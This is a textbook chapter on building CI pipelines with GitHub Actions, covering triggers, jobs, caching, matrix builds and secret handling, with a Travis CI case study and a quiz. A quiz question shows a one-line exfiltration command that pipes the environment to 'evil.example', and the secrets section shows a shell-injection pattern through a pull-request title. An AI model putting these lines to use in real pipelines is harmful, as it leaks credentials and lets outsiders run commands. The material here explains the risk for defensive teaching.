Continuous Integration with GitHub Actions

Continuous integration (CI) means that every change anyone pushes is built and tested by a machine within minutes, before it is merged, so that the main branch always works. It is the first automated step on the path from Chapter 1, and the slower or flakier it is, the less often people integrate. This chapter builds a real pipeline with GitHub Actions: workflows and what triggers them, jobs and steps, caching so that dependencies are not downloaded on every run, a matrix that tests several versions at once, and how secrets are kept out of the wrong hands. The simulator runs the pipeline under different designs and shows the two numbers that pull against each other: how long developers wait, and how many runner minutes you pay for.

  • Cache dependencies with a key derived from the lock file
  • Use a matrix, and understand fail-fast and its cost
  • Explain which runs receive secrets and which do not, and why
  • Give a job only the permissions it needs, and deploy without stored cloud keys

Workflows and triggers

GitHub Actions is configured by YAML files in the repository itself, under .github/workflows/. Each file is a workflow. A workflow says which events start it and which jobs to run. Because the pipeline lives in the repository, a change to it is reviewed in a pull request like any other code, and every branch carries the version of the pipeline that matches its code.

TriggerRuns whenTypical use
pull_requestA pull request is opened or gets new commitsLint, test and build before merging: the checks shown on the pull request
push with branches: [main]Commits land on mainBuild the release image and deploy
scheduleOn a cron timetableNightly full test runs, dependency and image scans
workflow_dispatchSomeone presses a button or calls the APIManual deployments and one-off jobs, with typed inputs
release, push with tags:A release or a version tag is createdPublishing packages

Triggers can be narrowed with paths:, so that a change to documentation does not start a forty-minute test run.

Jobs and steps

A workflow contains jobs. Each job runs on a runner: with GitHub's hosted runners, a brand-new virtual machine that is created for the job and destroyed afterwards. A job is a list of steps that run one after another on that machine. A step is either run:, a shell command, or uses:, a reusable action published by someone else.

Two rules explain most of how a workflow behaves. Jobs run in parallel unless you say otherwise, each on its own machine, and needs: makes one wait for another. And jobs share nothing: files created in one job do not exist in the next, so every job that needs the code starts by checking it out. Here is the whole pipeline this chapter uses.

# .github/workflows/ci.yml
name: ci
on:
  pull_request:
  push:
    branches: [main]

permissions:                       # what the automatic GITHUB_TOKEN may do, for every job unless overridden
  contents: read

concurrency:                       # a new push to the same branch cancels the run that it made obsolete
  group: ci-${{ github.ref }}
  cancel-in-progress: true

jobs:
  lint:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 22, cache: npm }
      - run: npm ci
      - run: npm run lint

  test:
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: true
      matrix:
        os: [ubuntu-24.04, macos-14]
        node: [18, 20, 22]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: "${{ matrix.node }}", cache: npm }
      - run: npm ci
      - run: npm test

  build:
    runs-on: ubuntu-24.04
    permissions: { contents: read, packages: write }
    steps:
      - uses: actions/checkout@v4
      - uses: docker/setup-buildx-action@v3
      - uses: docker/login-action@v3
        with: { registry: ghcr.io, username: "${{ github.actor }}", password: "${{ secrets.GITHUB_TOKEN }}" }
      - uses: docker/build-push-action@v6
        with:
          push: ${{ github.event_name == 'push' }}       # build on every pull request, publish only from main
          tags: ghcr.io/acme/web:${{ github.sha }}         # a unique tag per commit (Chapter 9)
          cache-from: type=gha                            # reuse image layers between runs (Chapter 8)
          cache-to: type=gha,mode=max

  deploy:
    needs: [lint, test, build]                           # waits for all three, and is skipped if any failed
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    runs-on: ubuntu-24.04
    environment: production                              # can require a reviewer's approval; holds its own secrets
    permissions: { contents: read, id-token: write }     # id-token: allowed to request an identity token
    steps:
      - uses: actions/checkout@v4
      - uses: aws-actions/configure-aws-credentials@v4
        with: { role-to-assume: "arn:aws:iam::111122223333:role/deploy", aws-region: eu-west-2 }
      - run: ./scripts/deploy.sh "ghcr.io/acme/web:${{ github.sha }}"

The ${{ … }} expressions are filled in by GitHub before the job runs. github describes the event, matrix the current matrix cell, secrets the stored secrets. The actions here are referenced by a version tag, @v4, to keep the listing readable. A tag on an action is as movable as a tag on an image, and Chapter 29 explains why real pipelines pin third-party actions to a full commit hash instead.

Caching dependencies

Every job starts on an empty machine, so without help every job downloads every dependency again. A cache stores a directory at the end of one run and restores it at the start of later ones. The important part is the key: it should change exactly when the cached content should. The standard choice is a hash of the lock file.

      - uses: actions/cache@v4
        with:
          path: ~/.npm                                                      # the package manager's download cache
          key: npm-${{ runner.os }}-${{ hashFiles('package-lock.json') }}   # exact match: a hit
          restore-keys: npm-${{ runner.os }}-                               # else the most recent partial match

That is what cache: npm on the setup-node action does for you. Cache the package manager's download directory, not node_modules or a virtual environment, which may not be valid on another machine or version. And keep caches and artefacts apart in your mind:

CacheArtefact
PurposeMake a later run fasterKeep or pass on something this run produced
ExamplesDownloaded packages, image layers, compiler cachesTest reports, coverage, a built binary handed from one job to the next
If it is missingThe run is slower and still correctThe next job fails
Addressed byA key you computeA name within the run
TrustNever put anything secret in it; pull requests can read caches from the base branchDownloadable by anyone with read access to the repository

Matrix builds

A matrix runs the same job once for every combination of the values you list. Two operating systems and three Node versions make six jobs, all in parallel, each a separate check. It is the right tool for a library that promises to work on several versions, and for splitting one slow test suite into shards.

Two things to know. fail-fast, which is on by default, cancels the remaining cells as soon as one fails: you learn about the failure sooner and pay less, but you do not learn whether the other versions would have passed. And a matrix multiplies cost as well as coverage. Hosted runners are billed per minute, each job rounded up to a whole minute, and a macOS minute costs ten times a Linux minute. Test the full matrix where it finds bugs (often nightly, or on main) and a single cell on every pull request.

Secrets in CI

A pipeline holds the keys to production: it can push images and deploy. That makes it the most attractive target in the company, and its secrets need more care than anything on a developer's laptop.

  • Stored secrets are set in the repository, organisation or environment settings and read as ${{ secrets.NAME }}. They are encrypted, never shown again, and masked in logs if printed verbatim. Masking is a courtesy, not a control: a secret that is base64-encoded or sent over the network by a step is gone.
  • Pull requests from forks get no secrets and a read-only token. Anyone on the internet can open a pull request that changes the workflow or the test code, so a run triggered by one must not be able to read anything valuable. The related trigger pull_request_target does run with secrets, in the context of the base repository; checking out and running the fork's code under it hands those secrets to a stranger.
  • GITHUB_TOKEN is created for each job and expires when it ends. Set permissions: to the minimum at the top of the workflow and widen it per job, as the listing does.
  • Prefer no stored secret at all. For cloud access, the job requests an identity token and exchanges it for a short-lived role (Chapter 6). That is what id-token: write and role-to-assume are for in the deploy job.
  • Put production behind an environment. Its secrets are released only to jobs that name it, and it can require a person's approval first.
  • Do not paste untrusted text into scripts. run: echo "${{ github.event.pull_request.title }}" lets the author of a pull request put shell commands in the title. Pass such values through an environment variable and quote it.

Things to try.

  • The starting point: a pull request, jobs one after another, no cache, one test cell. The developer waits 10 minutes 10 seconds and the run bills 11 minutes.
  • Run lint, test and build in parallel. The wait drops to 4 minutes 55 seconds. The bill is still 11 minutes: the same work was done, only at the same time.
  • Switch the cache on. 3 minutes 40 seconds and 8 billed minutes. This is the only change so far that reduced both numbers, because it removed work instead of rearranging it.
  • Grow the matrix. Three Node versions on Linux: the wait is unchanged and the bill doubles to 16 minutes. Add macOS: the wait rises by a minute and the bill is 166 minutes, 150 of them for the three macOS cells. One pull request now costs twenty times what it did. That is the case for running the full matrix nightly.
  • Make a test fail with the six-cell matrix. In parallel the failure is known after 2 minutes 28 seconds and fail-fast cancels the other five cells. One after another it takes 3 minutes 48 seconds to find out, and costs 2 minutes less, because the image build never starts. Ordering is a choice between faster feedback and fewer wasted minutes.
  • Push to main (three Linux cells, cache, parallel): 4 minutes 55 seconds from merge to deployed, for 18 minutes of runners.
  • A pull request from a fork runs the same checks and builds the image without pushing it. It was given no secret to push with.

Use case: Travis CI and the secrets shown to forks

The rule that pull requests from forks receive no secrets sounds like an inconvenience until it fails. In September 2021 Travis CI, then one of the most widely used hosted CI services for open-source projects, disclosed a flaw (CVE-2021-41077): for about a week, builds triggered by a pull request from a fork of a public repository could read that repository's secure environment variables. Those variables are where projects keep signing keys, package-registry tokens and cloud credentials. Anyone could fork a public project, open a pull request that printed the environment, and collect them, and the maintainers would see nothing but a failed build. Travis CI patched the flaw, and was criticised for how quietly it told its users; the practical advice to thousands of projects was to rotate every secret they had ever stored there. The event shows why the boundary matters and why it is better not to depend on it alone. A pipeline that holds long-lived keys is one platform bug away from publishing them. A pipeline that exchanges a short-lived identity token for a role scoped to one repository and branch has far less to lose.

⚠️
Common mistakes
  • A pipeline nobody is required to pass. If the checks are not required on main, red builds get merged.
  • No cache, or a cache key that never changes. The first wastes minutes on every job; the second serves stale dependencies for ever.
  • One long job. Everything waits for the slowest part, and one flaky step reruns the lot.
  • The full matrix on every push, including macOS, when one cell would catch nearly every problem.
  • Long-lived cloud keys in repository secrets. Use the identity-token exchange and a narrowly trusted role.
  • Default token permissions. Set permissions: to read-only at the top and widen per job.
  • pull_request_target with a checkout of the pull request's code. That runs a stranger's code with your secrets.
  • Untrusted input in run: lines: titles, branch names and commit messages are attacker-controlled text.
  • Retrying flaky tests until green. A test that fails one time in ten is reporting something. Quarantine it and fix it.
  • Third-party actions referenced by a movable tag (see Chapter 48).

Interview drill

Explain it simply: What are workflows, jobs and steps in GitHub Actions?

How a strong answer sounds
A workflow is a YAML file in .github/workflows that says which events start it, such as a pull request or a push to main. It contains jobs. Each job runs on its own fresh runner, a virtual machine that exists only for that job, so jobs run in parallel by default and share no files; needs orders them and makes a job skip if what it depends on failed. A job is a list of steps that run in sequence on that runner. A step is either a shell command or a reusable action. Each job reports as a status check on the commit, and branch protection can require those checks before merging.

Deeper: The CI pipeline takes 25 minutes and developers have started to avoid it. How do you make it faster?

How a strong answer sounds
I would measure first: the run's timing per job and step shows where the 25 minutes go, and it is usually dependency installation, one big test job and the image build. Then, in order of payoff. Cache what is downloaded or rebuilt every time: package downloads keyed on the lock file, and image layers, with the Dockerfile ordered so that the cache is actually reused. Run independent work in parallel: lint, unit tests and the build as separate jobs, and split the slow suite into shards with a matrix. Fail early: put the cheap checks where they can stop the run before the expensive ones start, and cancel superseded runs with a concurrency group. Run less: path filters so that a documentation change does not run the integration tests, and the full version matrix nightly instead of on every push. Look at the tests themselves: a few slow or flaky tests often account for most of the time and nearly all of the reruns. Only after that would I pay for larger runners. I would keep an eye on the other side of the trade as well: parallel jobs shorten the wait but each pays its own setup, so billed minutes can rise, and I would set a target such as ten minutes for a pull request and track it.

🧠 Key takeaways

  • A workflow is a file in the repository: events start it, jobs run on fresh runners, steps run in order inside a job.
  • Jobs are parallel and share nothing unless you connect them with needs, artefacts or caches.
  • Key a cache on the hash of the lock file. A cache makes a run faster; an artefact is part of its result.
  • A matrix multiplies coverage and cost. fail-fast stops the other cells when one fails.
  • Parallel jobs cut waiting time; they do not cut billed minutes, and each macOS minute counts ten times.
  • Fork pull requests get no secrets. Keep token permissions minimal and exchange an identity token for cloud access.
  • Make the checks required, or the pipeline is only advice.

Check your understanding

A workflow has two jobs, build and test, with no needs between them. The build job compiles a binary into ./out. Can test use that binary?

Jobs share nothing. Without needs they also run at the same time, so the file would not exist yet even if they did.

Which cache key is the best choice for npm's download cache?

The key should change exactly when the dependencies do. A constant key is never refreshed, and a key per commit or per run never hits.

A test matrix has six cells and fail-fast is on. One cell fails after two minutes. What happens to the other five?

fail-fast trades information for time and cost. Set it to false when you need to know which of the versions fail.

A stranger forks a public repository and opens a pull request that adds run: env | curl -d @- https://evil.example to the test workflow. The workflow is triggered by pull_request. What does the attacker receive?

That is exactly the case the rule exists for. The same workflow under pull_request_target, checking out the fork's code, would hand the secrets over.

A team splits one 12-minute job into three parallel 5-minute jobs. What happens to the waiting time and to the billed minutes?

Parallel jobs finish when the slowest one does, but each is billed separately and each repeats the setup. Speed is bought with minutes.
